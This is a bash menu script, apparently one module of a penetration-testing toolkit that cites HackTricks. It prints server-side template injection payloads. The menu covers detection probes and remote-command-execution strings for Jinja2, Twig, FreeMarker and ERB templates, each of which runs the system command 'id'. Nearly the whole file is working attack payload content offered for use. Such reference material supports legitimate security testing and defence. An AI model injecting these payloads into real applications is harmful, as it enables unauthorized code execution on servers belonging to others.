#!/bin/bash
# HackTricks Ref: ssti.md
# Module: Server-Side Template Injection (SSTI)

echo -e "${C6}[WEB ATTACK: INJECTION_SSTI]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/ssti"
echo -e "--------------------------------------------------"

echo -e "${C4}Select SSTI Engine/Vector:${NC}"
echo "1) Detection Payloads (Polyglot)"
echo "2) Jinja2 / Mako (Python)"
echo "3) Twig / Smarty (PHP)"
echo "4) FreeMarker / Velocity (Java)"
echo "5) ERB (Ruby)"
echo "0) Exit"

read -p "Selection: " ssti_opt

case $ssti_opt in
    1)
        echo -e "\n${C2}[*] Detection (The Math Test):${NC}"
        echo "Inject these and look for '49' in the response:"
        echo " - {{7*7}}"
        echo " - \${7*7}"
        echo " - <%= 7*7 %>"
        echo " - #{7*7}"
        ;;
    2)
        echo -e "\n${C2}[*] Jinja2 (Python) RCE:${NC}"
        echo "Try to access the config or execute commands:"
        echo " - {{ config.items() }}"
        echo " - {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
        ;;
    3)
        echo -e "\n${C2}[*] Twig (PHP) RCE:${NC}"
        echo "Payload to execute system commands:"
        echo " - {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
        ;;
    4)
        echo -e "\n${C2}[*] FreeMarker (Java) RCE:${NC}"
        echo "Execute shell commands using the 'Execute' object:"
        echo " - <#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}}"
        ;;
    5)
        echo -e "\n${C2}[*] ERB (Ruby) RCE:${NC}"
        echo "Standard Ruby command execution:"
        echo " - <%= \`id\` %>"
        echo " - <%= IO.popen('id').read %>"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
